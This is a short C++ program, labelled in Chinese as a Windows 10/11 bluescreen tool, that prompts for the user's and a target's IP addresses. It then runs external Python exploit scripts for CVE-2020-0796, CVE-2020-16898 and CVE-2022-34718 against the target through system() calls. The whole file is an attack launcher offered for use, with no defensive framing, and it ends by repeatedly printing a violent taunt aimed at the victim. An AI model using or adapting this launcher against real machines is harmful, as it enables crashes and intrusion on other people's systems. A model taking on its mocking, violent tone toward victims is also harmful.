#include<windows.h>
#include<stdio.h>
#include<iostream>
#include<string.h>
using namespace std;
int main()
{
	char myIPv6[256];
	char myIPv4[256];
	char exploitIPv4[256];
	char exploitIPv6[256];
	char command[512];
	cout<<"============Windows10,11蓝屏器============"<<endl;
	cout<<"输入本机本地链接IPv6地址"<<endl;
	cin>>myIPv6;
	cout<<"输入本机IPv4地址"<<endl;
	cin>>myIPv4;
	cout<<"输入靶机IPv6地址"<<endl;
	cin>>exploitIPv6;
	cout<<"输入靶机IPv4地址"<<endl;
	cin>>exploitIPv4;
	cout<<"开始攻击:"<<endl;
	cout<<"正在利用CVE-2020-0796，针对Windows10..."<<endl;
	sprintf(command,"%s%s%s%s%s%d","py CVE-2020-0796.py ",exploitIPv4," ",myIPv4," ",4321);
	cout<<"执行命令："<<command<<endl;
	system(command);
	/*CVE-2020-0796失败*/
	cout<<"正在利用CVE-2020-16898，针对Windows10..."<<endl;
	memset(command, 0, sizeof command);
	sprintf(command,"%s%s%s%s","py CVE-2020-16898.py ",exploitIPv6," ",myIPv6);
	cout<<"执行命令："<<command<<endl;
	system(command);
	/*CVE-2020-16898失败*/
	cout<<"正在利用CVE-2022-34718，针对Windows10,Windows11..."<<endl;
	memset(command, 0, sizeof command);
	sprintf(command,"%s%s","py CVE-2022-34718.py ",exploitIPv6);
	cout<<"执行命令："<<command<<endl;
	system(command);
	for(int i=1;i<=10;i++)
	{
		cout<<"如果现在那个受害者都没坐轮椅，可以尝试把他宰了:)"<<endl;
	}
	return 0;
}
